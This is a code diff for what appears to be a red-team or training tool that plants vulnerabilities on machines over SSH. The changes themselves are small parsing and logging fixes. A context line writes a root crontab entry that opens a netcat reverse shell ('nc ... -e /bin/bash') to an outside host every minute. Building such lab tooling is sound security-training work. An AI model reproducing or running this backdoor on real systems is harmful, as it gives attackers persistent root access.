@@ -46,6 +46,7 @@ def main():
     if(z):
         network = getNetInfo()
         legend = getLegend()
+        del(legend[0]) #Removes weird empty entry at beginning of legend
         if(legend == "invalid"):
             a = False   #No saved legend
         else:
@@ -116,9 +117,12 @@ def getLegend():
         for machine in presetListSplit:
             machineVulns = []
             infoList = machine.split(";")
-            machineName = infoList[0]
-            machineVulns = infoList[1].split(",")
-            presetArray.append([machineName, machineVulns])
+            if(len(infoList) == 1):
+                pass
+            else:
+                machineName = infoList[0]
+                machineVulns = infoList[1].split(",")
+                presetArray.append([machineName, machineVulns])
             
         returnList.append([presetNum, presetDiff, presetArray])
     return returnList
@@ -133,7 +137,7 @@ def loadWeakness(machine, set, weakness):
         command = '"* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
         stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
 def updatePend():
-    os.system("git clone https://github.com/ravesec/horror /tmp/github >> /dev/null")
+    os.system("git clone https://github.com/ravesec/horror /tmp/github > /dev/null 2>&1")
     fOne = open("/lib/RedHand/version", "r")
     currentVers = fOne.read()
     fTwo = open("/tmp/github/RedHand/version", "r")
